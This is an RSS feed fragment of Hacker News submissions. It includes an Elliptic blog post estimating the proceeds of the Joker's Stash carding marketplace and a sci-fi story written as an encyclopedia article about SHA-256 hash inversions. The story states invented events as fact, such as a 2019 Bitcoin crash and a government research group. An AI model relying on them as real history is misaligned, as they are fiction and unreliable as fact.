February 14, 2021 | https://www.bikeblogordie.com/2016/11/what-ever-happened-to-scandium-bike.html | <a href="https://web.archive.org/web/*/https://www.bikeblogordie.com/2016/11/what-ever-happened-to-scandium-bike.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.bikeblogordie.com/2016/11/what-ever-happened-to-scandium-bike.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136608</guid>
            <pubDate>Sun, 14 Feb 2021 21:51:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One of the Most Prolific Cybercriminals Has Retired and May Be a Billionaire]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136276">thread link</a>) | @1cvmask
<br/>
February 14, 2021 | https://www.elliptic.co/blog/jokers-stash-retiring | <a href="https://web.archive.org/web/*/https://www.elliptic.co/blog/jokers-stash-retiring">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<figure>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=594&amp;height=310&amp;name=joker-stash-elliptic.png" alt="" width="594" height="310" srcset="https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=297&amp;height=155&amp;name=joker-stash-elliptic.png 297w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=594&amp;height=310&amp;name=joker-stash-elliptic.png 594w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=891&amp;height=465&amp;name=joker-stash-elliptic.png 891w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=1188&amp;height=620&amp;name=joker-stash-elliptic.png 1188w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=1485&amp;height=775&amp;name=joker-stash-elliptic.png 1485w, https://www.elliptic.co/hs-fs/hubfs/joker-stash-elliptic.png?width=1782&amp;height=930&amp;name=joker-stash-elliptic.png 1782w" sizes="(max-width: 594px) 100vw, 594px">
</p>
</figure>
<div>
<figure>
<img src="https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=65&amp;height=65&amp;name=ell-author-tom-robinson.jpg" alt="Dr. Tom Robinson" width="65" height="65" srcset="https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=33&amp;height=33&amp;name=ell-author-tom-robinson.jpg 33w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=65&amp;height=65&amp;name=ell-author-tom-robinson.jpg 65w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=98&amp;height=98&amp;name=ell-author-tom-robinson.jpg 98w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=130&amp;height=130&amp;name=ell-author-tom-robinson.jpg 130w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=163&amp;height=163&amp;name=ell-author-tom-robinson.jpg 163w, https://www.elliptic.co/hs-fs/hubfs/2020%20Website/Authors/ell-author-tom-robinson.jpg?width=195&amp;height=195&amp;name=ell-author-tom-robinson.jpg 195w" sizes="(max-width: 65px) 100vw, 65px">
</figure>
<div>


<h5>Elliptic's Co-founder and Chief Scientist discusses cryptocurrency forensics, investigations, compliance, and sanctions.</h5>
</div>
</div>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">
<p><strong>Hundreds of millions of cards have been stolen from online retailers, banks and payments companies before being sold for cryptocurrency on dozens of online marketplaces. According to Elliptic‚Äôs analysis, the founder of one of the most popular carding marketplaces, Joker‚Äôs Stash, has retired having amassed a fortune of over $1 billion.</strong></p>
<p>Every time you make a purchase with a credit or debit card, your card details are transmitted and stored in computer systems. Many of the major hacks of retailers and other companies are motivated by getting hold of these card credentials.</p>
<p>Stolen cards have value because they can be used to purchase high-value items or gift cards, which can then be resold for cash. This process is known as ‚Äúcarding‚Äù, and has become a key part of the cybercriminal‚Äôs playbook. Carding is very profitable in its own right, but it is also used to help launder and cash-out cryptocurrency obtained through other types of cybercrime.</p>

<p><strong>J</strong><strong>oker‚Äôs Stash - the King of Carding</strong></p>
<p>Over the past six years, Joker‚Äôs Stash rose to become the largest online seller of stolen credit cards and identity data. It is an example of a carding AVC (automated vending cart), which allows large volumes of cards to be sorted, filtered and purchased for Bitcoin with immediate delivery. In the image below you can see these cards categorised and searchable by country, bank, expiry date and other attributes. The going price for a single card on Joker‚Äôs Stash ranges from $1 to $150, with those at the upper end coming complete with the cardholder‚Äôs name, address and social security number.</p>
<!--more-->
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=512&amp;name=Jokers%20Stash%20Blog_1-1.png" alt="Jokers Stash Blog_1-1" width="512" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=256&amp;name=Jokers%20Stash%20Blog_1-1.png 256w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=512&amp;name=Jokers%20Stash%20Blog_1-1.png 512w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=768&amp;name=Jokers%20Stash%20Blog_1-1.png 768w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=1024&amp;name=Jokers%20Stash%20Blog_1-1.png 1024w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=1280&amp;name=Jokers%20Stash%20Blog_1-1.png 1280w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_1-1.png?width=1536&amp;name=Jokers%20Stash%20Blog_1-1.png 1536w" sizes="(max-width: 512px) 100vw, 512px"><span></span></p>
<p><span>A screenshot from Joker‚Äôs Stash, showing individual payment cards for sale together with details of the cardholder</span></p>
<p>Joker‚Äôs Stash began operations in 2014. Its founder announced the site‚Äôs launch in English and Russian-language posts on various carding forums, using the pseudonym ‚ÄúJokerStash‚Äù. The marketplace gained popularity due to the quality and volume of the cards offered, sourced from a network of ‚Äúpartners‚Äù - criminal groups that originally stole the card details.&nbsp; New batches of cards from major breaches of businesses were teased weeks in advance and given cryptic names. For example, two million cards <a href="https://gizmodo.com/2-million-credit-cards-exposed-after-hack-of-buca-di-be-1833710618"><span>belonging</span></a> to customers of US restaurant chain ‚ÄúBuca di Beppo‚Äù were marketed as the ‚ÄúDAVINCI BREACH‚Äù, while the five million cards making up the ‚ÄúBIGBADABOOM-2‚Äù batch likely <a href="https://www.nytimes.com/2018/04/01/technology/saks-lord-taylor-credit-cards.html"><span>originated</span></a> from retailer Saks Fifth Avenue.</p>

<p><strong>Using blockchain analytics to estimate sales volumes</strong></p>
<p>The revenues earned by Joker‚Äôs Stash can be estimated from the value of incoming cryptocurrency payments to its wallet, as seen on the blockchain. Since 2015 almost $400 million in bitcoin was sent to the marketplace, with annual sales peaking at $139 million in 2018. Sales dropped over the next two years, reflecting a broader downtrend in carding activity - increased security around card payments has made their theft more difficult, while advances in anti-fraud technology have made it more challenging for carders to make purchases with stolen cards.</p>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=1200&amp;name=Jokers%20Stash%20Blog_2-1.png" alt="Jokers Stash Blog_2-1" width="1200" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=600&amp;name=Jokers%20Stash%20Blog_2-1.png 600w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=1200&amp;name=Jokers%20Stash%20Blog_2-1.png 1200w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=1800&amp;name=Jokers%20Stash%20Blog_2-1.png 1800w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=2400&amp;name=Jokers%20Stash%20Blog_2-1.png 2400w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=3000&amp;name=Jokers%20Stash%20Blog_2-1.png 3000w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_2-1.png?width=3600&amp;name=Jokers%20Stash%20Blog_2-1.png 3600w" sizes="(max-width: 1200px) 100vw, 1200px"><span>Value of Bitcoin payments received by Joker‚Äôs Stash, by year</span></p>
<p>This carding downturn may be one of the reasons that Joker‚Äôs Stash recently announced that it would be closing permanently. The marketplace has also faced other headwinds in recent months - JokerStash notified customers in October that he/she had been hospitalised for over a week with coronavirus, while in December Interpol and the FBI <a href="https://www.zdnet.com/article/fbi-interpol-disrupt-jokers-stash-the-internets-largest-carding-marketplace/"><span>announced</span></a> a coordinated seizure of domains used by the site. The servers themselves were apparently unaffected and the site remained operational through TOR mirrors (although some users suspect that the takedown was successful and that law enforcement now control the site - a tactic used with some darknet markets).</p>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=600&amp;name=Jokers%20Stash%20Blog_4.png" alt="Jokers Stash Blog_4" width="600" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=300&amp;name=Jokers%20Stash%20Blog_4.png 300w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=600&amp;name=Jokers%20Stash%20Blog_4.png 600w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=900&amp;name=Jokers%20Stash%20Blog_4.png 900w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=1200&amp;name=Jokers%20Stash%20Blog_4.png 1200w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=1500&amp;name=Jokers%20Stash%20Blog_4.png 1500w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_4.png?width=1800&amp;name=Jokers%20Stash%20Blog_4.png 1800w" sizes="(max-width: 600px) 100vw, 600px"><span>Joker‚Äôs Stash announces its own closure</span></p>
<p>Another possible reason for the closure is simply that its founder has made so much money that it is no longer worth the effort and risk to continue operations, a sentiment suggested by the closure notice posted by JokerStash on the site:</p>
<p><img src="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=600&amp;name=Jokers%20Stash%20Blog_6.png" alt="Jokers Stash Blog_6" width="600" srcset="https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=300&amp;name=Jokers%20Stash%20Blog_6.png 300w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=600&amp;name=Jokers%20Stash%20Blog_6.png 600w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=900&amp;name=Jokers%20Stash%20Blog_6.png 900w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=1200&amp;name=Jokers%20Stash%20Blog_6.png 1200w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=1500&amp;name=Jokers%20Stash%20Blog_6.png 1500w, https://www.elliptic.co/hs-fs/hubfs/Jokers%20Stash%20Blog_6.png?width=1800&amp;name=Jokers%20Stash%20Blog_6.png 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>

<p><strong>How large is Joker‚Äôs Bitcoin Stash?</strong></p>
<p>We can estimate JokerStash‚Äôs retirement fund by considering the fees charged by the marketplace. The first source of revenue is cryptocurrency deposit fees. Any cryptocurrency payments to the site are converted to a US dollar balance, calculated according to the prevailing exchange rate, minus a fee ranging from 8% in the early days of the site to 4% today. On top of that, the marketplace almost certainly takes a cut of all sales of cards provided by the site‚Äôs partners. The commission taken by Joker‚Äôs Stash is not known, but for similar marketplaces it ranges between 10 to 30%.</p>
<p>The other key piece of information to take into account is that according to cyber security firm <a href="https://geminiadvisory.io/jokers-stash-shuts-down/"><span>Gemini Advisory</span></a>, JokerStash claims to keep all proceeds of the marketplace in bitcoin. If that is the case then the recent bitcoin price increase would have substantially inflated the value of assets. If we assume an average total commission of 20% on sales, then considering bitcoin alone (the site also accepts Litecoin and Dash) they would have taken a total of at least 60,000 bitcoins - which today has a value of $2.5 billion.</p>

<p><strong>An opportunity for other carding markets to fill the void</strong></p>
<p>Joker‚Äôs Stash announced that it would cease operations on 15th February, although the site became inaccessible as of the 3rd February, angering many customers, who still had balances to spend. It is one of the few criminal marketplaces to shut down on its own terms, a victim of its own success rather than as a result of any apparent law enforcement operation. This will no doubt encourage others to take its place at the heart of the cybercrime economy.</p>

<p><strong>Related Articles</strong></p>
<ul>
<li><a href="https://www.reuters.com/article/crypto-currency-crime/darknet-crypto-kingpin-jokerstash-retires-after-illicit-1-billion-run-research-idUKL4N2KH2IW" rel="noopener">Reuters feature Elliptic research on the Darknet crypto kingpin JokerStash</a></li>
</ul>
<p>Learn more about how Elliptic helps crypto businesses and financial institutions<span>&nbsp;</span><a href="https://www.elliptic.co/what-we-do/aml-navigator" rel="noopener" target="_blank">manage their cryptoasset risk</a>.&nbsp;</p>
<p>Don‚Äôt have Elliptic backing up your crypto AML compliance operations already?</p>
<p><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-22b79504-3ecb-4028-ab2d-42c058ec8014"><span id="hs-cta-22b79504-3ecb-4028-ab2d-42c058ec8014"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/3883533/22b79504-3ecb-4028-ab2d-42c058ec8014" target="_blank"><img id="hs-cta-img-22b79504-3ecb-4028-ab2d-42c058ec8014" src="https://no-cache.hubspot.com/cta/default/3883533/22b79504-3ecb-4028-ab2d-42c058ec8014.png" alt="SCHEDULE A DEMO"></a></span></span><!-- end HubSpot Call-to-Action Code --></p></span>
</p>

</div>
</div></div>]]>
            </description>
            <link>https://www.elliptic.co/blog/jokers-stash-retiring</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136276</guid>
            <pubDate>Sun, 14 Feb 2021 21:08:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Basilisk Collection ‚Äì A Hard Sci-Fi Story About SHA-256]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26136206">thread link</a>) | @blackle
<br/>
February 14, 2021 | https://suricrasia.online/unfiction/basilisk/ | <a href="https://web.archive.org/web/*/https://suricrasia.online/unfiction/basilisk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" dir="ltr" lang="en"><div>
<p>The <b>basilisk collection</b> (also known as the <b>basilisk file</b> or <b>basilisk.txt</b>) is a collection of over 125 million <a href="https://en.wikipedia.org/wiki/Proof_of_work#Background" title="Proof of work">partial hash inversions</a> of the <a href="https://en.wikipedia.org/wiki/SHA-256" title="SHA-256">SHA-256</a> <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function" title="Cryptographic hash function">cryptographic hash function</a>. Assuming state-of-the art methods were used to compute the inversions, the entries in the collection collectively represent a <a href="https://en.wikipedia.org/wiki/Proof-of-work" title="Proof-of-work">proof-of-work</a> far exceeding the computational capacity of the human race.<sup id="cite_ref-calc_1-0"><a href="#cite_note-calc-1">[1]</a></sup><sup id="cite_ref-killed_2-0"><a href="#cite_note-killed-2">[2]</a></sup> The collection was released in parts through <a href="https://en.wikipedia.org/wiki/BitTorrent" title="BitTorrent">BitTorrent</a> beginning in June 2018, although it was not widely reported or discussed until early 2019.<sup id="cite_ref-history_3-0"><a href="#cite_note-history-3">[3]</a></sup> On August 4th, 2019 the complete collection of 125,552,089 known hash inversions was compiled and published by <a href="https://en.wikipedia.org/wiki/University_of_Toronto#CryTor" title="University of Toronto">CryTor</a>, the cybersecurity lab of the <a href="https://en.wikipedia.org/wiki/University_of_Toronto" title="University of Toronto">University of Toronto</a>.<sup id="cite_ref-toronto_4-0"><a href="#cite_note-toronto-4">[4]</a></sup>
</p><p>The existence of the basilisk collection has had wide reaching consequences in the field of cryptography, and has been blamed for catalyzing the <a href="https://en.wikipedia.org/wiki/Bitcoin#Basilisk_crash" title="Bitcoin">January 2019 Bitcoin crash</a>.<sup id="cite_ref-killed_2-1"><a href="#cite_note-killed-2">[2]</a></sup><sup id="cite_ref-bitcoin-general_5-0"><a href="#cite_note-bitcoin-general-5">[5]</a></sup><sup id="cite_ref-6"><a href="#cite_note-6">[6]</a></sup>
</p>


<h2><span id="Background">Background</span></h2>
<h3><span id="Hash_functions">Hash functions</span></h3>

<p>A <a href="https://en.wikipedia.org/wiki/Hash_function" title="Hash function">hash function</a> is a mathematical function that takes an input (or "message") of arbitrary length and computes a fixed size output, often a number within a defined range. This output is often called the "hash", "digest", or "checksum." A cryptographic hash function is a hash function with additional requirements that make it suitable for use in <a href="https://en.wikipedia.org/wiki/Cryptography" title="Cryptography">cryptography</a>.
</p><p>The ideal cryptographic hash function has five main properties:
</p>
<ul><li><b><a href="https://en.wikipedia.org/wiki/Deterministic_algorithm" title="Deterministic algorithm">Determinism</a></b>: the same message always results in the same hash.</li>
<li><b>Efficiency</b>: it is quick to compute the hash value for any given message.</li>
<li><b><a href="https://en.wikipedia.org/wiki/One-way_function" title="One-way function">One-way</a></b>: it is intractable to generate a message that yields a given hash value.</li>
<li><b><a href="https://en.wikipedia.org/wiki/Avalanche_effect" title="Avalanche effect">Avalanche effect</a></b>: a small change to a message results in a completely dissimilar output.</li>
<li><b><a href="https://en.wikipedia.org/wiki/Collision_resistance" title="Collision resistance">Collision resistance</a></b>: it is infeasible to find two different messages with the same hash value.</li></ul>
<p><a href="https://en.wikipedia.org/wiki/SHA-256" title="SHA-256">SHA-256</a> is one such hash function designed by the United States <a href="https://en.wikipedia.org/wiki/National_Security_Agency" title="National Security Agency">National Security Agency</a> (NSA), one of six functions in the SHA-2 (Secure Hash Algorithm 2) family. The 256 refers to the number of bits in the computed digest.<sup id="cite_ref-7"><a href="#cite_note-7">[7]</a></sup>
</p>
<h3><span id="Proof_of_work_systems">Proof of work systems</span></h3>

<p>Hash functions are often used as the basis for proof of work systems. A proof of work is any certificate or signature that implies some quantity of computation was performed. A partial hash inversion is one such example, wherein a <a href="https://en.wikipedia.org/wiki/Cryptographic_nonce" title="Cryptographic nonce">nonce value</a> must be found such that‚Äîwhen concatenated with a challenge string‚Äîthe resulting hash is below some target value. Lower target values require more computations on average to find an appropriate nonce, and so a proof of work system can be made more difficult by decreasing its target value.
</p><p>For example, suppose the challenge was "ABC" and the target value was 2<sup>224</sup>. To generate the proof of work, one must find a value N such that SHA-256("ABC" || N) &lt; 2<sup>224</sup>. Because SHA-256 is believed to have <a href="https://en.wikipedia.org/wiki/Preimage_resistance" title="Preimage resistance">preimage resistance</a>, there should be no way to find a value for N that is more efficient than picking values at random until a sufficient value is found. For the target value of 2<sup>224</sup>, this is expected to take on average 2<sup>32</sup> hash evaluations. It is entirely possible for a value to be found with fewer than 2<sup>32</sup> hash evaluations; however the likelihood of this occurring falls off exponentially as the number of calculated hashes decreases.<sup id="cite_ref-8"><a href="#cite_note-8">[8]</a></sup><sup id="cite_ref-9"><a href="#cite_note-9">[9]</a></sup>
</p><p>In general, for a hash of N bits, a target value of 2<sup>K</sup> would require on average 2<sup>(N-K)</sup> hash evaluations to find a corresponding nonce value.
</p>
<h2><span id="Description">Description</span></h2>
<p>The largest basilisk collection includes 125,552,089 partial hash inversions of the SHA-256 algorithm applied twice.<sup id="cite_ref-toronto_4-1"><a href="#cite_note-toronto-4">[4]</a></sup> These inversions follow a particular pattern. Using the language of proof-of-work systems: the inversions use the challenge string "basilisk:N:" where N is a 10 digit number and the target value is no less than 2<sup>168</sup>. The value for N begins at 0 and increases monotonically to 499,999,999. Because there are only 125 million hashes in the collection, several ranges for N are missing. The generated nonce values are 64 characters in length and are alphanumeric including capitals.
</p><p>The first five entries in the collection are:
</p>
<pre>basilisk:0000000000:ds26ovbJzDwkVWia1tINLJZ2WXEHBvItMZRxHmYhlQd0spuvPXb6cYFJorDKkqlA 0000000000000000000000161b9f84a187cc21b172bf68b3cb3b78684d8e9f17
basilisk:0000000001:dMHUhnoEkmLv8TSE1lnJ7nVIYM8FLYBRtzTiJCM8ziijpTj95MPptu6psZZyLBVA 0000000000000000000000cee5fe5df2d3034fff435bb40e8651a18d69e81460
basilisk:0000000002:aSCZwTSmH9ZtqB5gQ27mcGuKIXrghtYIoMp6aKCLvxhlf1FC5D1sZSi2SjwU9EqK 000000000000000000000012aabd8d935757db173d5b3e7ae0f25ea4eb775402
basilisk:0000000003:oeocInD9uFwIO2x5u9myS4MKQbFW8Vl1IyqmUXHV3jVen6XCoVtuMbuB1bSDyOvE 000000000000000000000039d50bb560770d051a3f5a2fe340c99f81e18129d1
basilisk:0000000004:m0EyKprlUmDaW9xvPgYMz2pziEUJEzuy6vsSTlMZO7lVVOYlJgJTcEvh5QVJUVnh 00000000000000000000002ca8fc4b6396dd5b5bcf5fa80ea49967da55a8668b
</pre>
<p>These plaintext and hash pairs can be verified with the <a href="https://en.wikipedia.org/wiki/OpenSSL" title="OpenSSL">OpenSSL</a> software library:
</p>
<div dir="ltr"><pre><span></span><span>$</span> <span>echo</span> -en <span>'basilisk:0000000000:ds26ovbJzDwkVWia1tINLJZ2WXEHBvItMZRxHmYhlQd0spuvPXb6cYFJorDKkqlA'</span> <span>|</span> openssl dgst -sha256 -binary <span>|</span> openssl dgst -sha256
<span>(stdin)</span><span>= 0000000000000000000000161b9f84a187cc21b172bf68b3cb3b78684d8e9f17</span>
</pre></div>
<p>Aside from the word "basilisk" being included in every hash inversion, no other messages or text are included in the primary sources for the basilisk collection. Some hoax collections have appeared with text added to the start or end, however in every case an earlier source could be found with no extra text.<sup id="cite_ref-toronto_4-2"><a href="#cite_note-toronto-4">[4]</a></sup>
</p>
<h2><span id="History">History</span></h2>
<p>A small subset of the basilisk collection first appeared on the internet sometime before June 2018.<sup id="cite_ref-history_3-1"><a href="#cite_note-history-3">[3]</a></sup> This subset included 15,000 partial hash inversions and was distributed on the <a href="https://en.wikipedia.org/wiki/BitTorrent" title="BitTorrent">BitTorrent network</a>. Although the file was made available for several months and gathered a small collection of seeding clients,<sup id="cite_ref-dht-telescope_10-0"><a href="#cite_note-dht-telescope-10">[10]</a></sup> no public discussion of the basilisk hashes could be found before early December 2018, and it is likely that these original seeders were automated <a href="https://en.wikipedia.org/wiki/Seedbox" title="Seedbox">seedboxes</a> or BitTorrent indexing services.<sup id="cite_ref-11"><a href="#cite_note-11">[11]</a></sup><sup id="cite_ref-history_3-2"><a href="#cite_note-history-3">[3]</a></sup> Throughout 2018 larger subsets of the basilisk collection continued to appear on the BitTorrent network. The largest subset, constituting 15 million hashes beginning with id 83,000,000, was first indexed mid December 2018.<sup id="cite_ref-dht-telescope_10-1"><a href="#cite_note-dht-telescope-10">[10]</a></sup><sup id="cite_ref-timeline_12-0"><a href="#cite_note-timeline-12">[12]</a></sup> This subset was discussed at length and its <a href="https://en.wikipedia.org/wiki/Magnet_URI_scheme" title="Magnet URI scheme">magnet link</a> passed around within the cryptographic community.<sup id="cite_ref-break1_13-0"><a href="#cite_note-break1-13">[13]</a></sup> Early in the new year, a number of internet news outlets broke the story on the security implications of the basilisk collection, bringing it to the attention of the wider public.<sup id="cite_ref-timeline_12-1"><a href="#cite_note-timeline-12">[12]</a></sup><sup id="cite_ref-break1_13-1"><a href="#cite_note-break1-13">[13]</a></sup><sup id="cite_ref-14"><a href="#cite_note-14">[14]</a></sup><sup id="cite_ref-break3_15-0"><a href="#cite_note-break3-15">[15]</a></sup>
</p><p>By the end of January 2019 the basilisk collection was known to have 76 million partial hash inversions, and throughout 2019 this number increased to 125 million as more subsets were discovered.<sup id="cite_ref-timeline_12-2"><a href="#cite_note-timeline-12">[12]</a></sup> These subsets were gathered by the <a href="https://en.wikipedia.org/wiki/University_of_Toronto#CryTor" title="University of Toronto">University of Toronto Cryptography Lab</a> (CryTor) into a definitive collection on August 4th, 2019.<sup id="cite_ref-toronto_4-3"><a href="#cite_note-toronto-4">[4]</a></sup> There remains roughly 200 possible basilisk subsets which were indexed by the <a href="https://en.wikipedia.org/wiki/Mainline_DHT" title="Mainline DHT">BitTorrent distributed hash table</a> but were never downloaded before the initial seeder or seeders went offline. This is believed to account for the missing 374,447,910 hash inversions.<sup id="cite_ref-toronto2_16-0"><a href="#cite_note-toronto2-16">[16]</a></sup>
</p>
<h2><span id="Cryptanalysis_and_validation">Cryptanalysis and validation</span></h2>
<p>The 125,552,089 plaintext and hash pairs in the basilisk collection can be readily verified on a standard desktop computer with appropriate cryptographic software such as <a href="https://en.wikipedia.org/wiki/OpenSSL" title="OpenSSL">OpenSSL</a>. This can take anywhere from a couple of seconds to a couple of minutes depending on the machine.<sup id="cite_ref-17"><a href="#cite_note-17">[17]</a></sup> Creating the hashes, on the other hand, would have required a computer orders of magnitude more powerful than any computer or network of computers that currently exist. For perspective, one generous estimate for the combined power of all the computers ever made is 1 <a href="https://en.wikipedia.org/wiki/FLOP" title="FLOP">zettaFLOP</a>, or 10<sup>21</sup> floating point operations per second.<sup id="cite_ref-calc_1-1"><a href="#cite_note-calc-1">[1]</a></sup> If we assume that one hash corresponds to one floating point operation (another very generous assumption) then the time it would take to generate a set of 125 million hashes is roughly 2 million years.<sup id="cite_ref-calc_1-2"><a href="#cite_note-calc-1">[1]</a></sup> Therefore, there must be a fault in the SHA-256 algorithm that would allow for a faster generation of partial hash inversions.
</p><p>Cryptanalysis of the basilisk hashes fall into one of two categories: analysis of the SHA-256 algorithm and analysis of 125 million hashes themselves.
</p>
<h3><span id="SHA-256_cryptanalysis">SHA-256 cryptanalysis</span></h3>
<p>SHA-256 is built using the <a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction" title="Merkle‚ÄìDamg√•rd construction">Merkle‚ÄìDamg√•rd structure</a>. To compute the hash, the message is separated into fixed length blocks and each individual block is incorporated into an internal state using a <a href="https://en.wikipedia.org/wiki/One-way_compression_function" title="One-way compression function">one-way compression function</a>. This compression function is applied many times, referred to as "rounds." For SHA-256, 64 rounds are employed for each block.
</p><p>No cryptographic attacks against the preimage resistance of SHA-256 are currently known for all 64 rounds. The best known attacks are for 52 of the 64 rounds. That is, for a reduced version of the function that only uses 52 rounds, there exist algorithms to invert a hash in less time than <a href="https://en.wikipedia.org/wiki/Brute_force" title="Brute force">brute force</a>.<sup id="cite_ref-18"><a href="#cite_note-18">[18]</a></sup>
</p><p>Although there is an abundance of cryptoanalytic research into the SHA-256 hash function, the same cannot be said for the double-SHA-256 function that the basilisk collection uses. This use of a "doubled" hash function is not a novel invention; hash doubling was initially proposed by Ferguson and Schneier in "Practical Cryptography"<sup id="cite_ref-19"><a href="#cite_note-19">[19]</a></sup> and is used in a variety of applications, most notably the <a href="https://en.wikipedia.org/wiki/Bitcoin" title="Bitcoin">Bitcoin</a> <a href="https://en.wikipedia.org/wiki/Cryptocurrency" title="Cryptocurrency">cryptocurrency</a>.<sup id="cite_ref-paper_20-0"><a href="#cite_note-paper-20">[20]</a></sup> The rationale behind the double application of a hash function is to provide resistance against <a href="https://en.wikipedia.org/wiki/Length_extension_attack" title="Length extension attack">length extension attacks</a>. The effect double hashing may have on preimage resistance of SHA-256 was largely unexplored until after the emergence of the basilisk collection.<sup id="cite_ref-paper1_21-0"><a href="#cite_note-paper1-21">[21]</a></sup><sup id="cite_ref-22"><a href="#cite_note-22">[22]</a></sup>
</p><p>Since 2019, research on doubled SHA-256 has increased dramatically. In February 2019 the <a href="https://en.wikipedia.org/wiki/Cryptographic_Module_Validation_Program#Double_SHA256_Special_Interest_Group" title="Cryptographic Module Validation Program">Double SHA256 Special Interest Group</a> (DSHASIG) was formed jointly within the <a href="https://en.wikipedia.org/wiki/National_Institute_of_Standards_and_Technology" title="National Institute of Standards and Technology">National Institute of Standards and Technology</a> (NIST), the <a href="https://en.wikipedia.org/wiki/Communications_Security_Establishment" title="Communications Security Establishment">Communications Security Establishment</a> (CSE), and the <a href="https://en.wikipedia.org/wiki/National_Security_Agency" title="National Security Agency">National Security Agency</a> (NSA). The intent of the DSHASIG is to accelerate research into preimage attacks of doubled SHA-256.<sup id="cite_ref-23"><a href="#cite_note-23">[23]</a></sup> Other organizations such as the <a href="https://en.wikipedia.org/wiki/Bitcoin_Foundation" title="Bitcoin Foundation">Bitcoin Foundation</a> have created funding ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://suricrasia.online/unfiction/basilisk/">https://suricrasia.online/unfiction/basilisk/</a></em></p>]]>
            </description>
            <link>https://suricrasia.online/unfiction/basilisk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136206</guid>
            <pubDate>Sun, 14 Feb 2021 20:59:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Effectively Manage an Existing Engineering Team]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26135955">thread link</a>) | @strife25
<br/>
February 14, 2021 | https://buildthestage.com/how-to-manage-existing-engineering-teams/ | <a href="https://web.archive.org/web/*/https://buildthestage.com/how-to-manage-existing-engineering-teams/">archive.org</a>
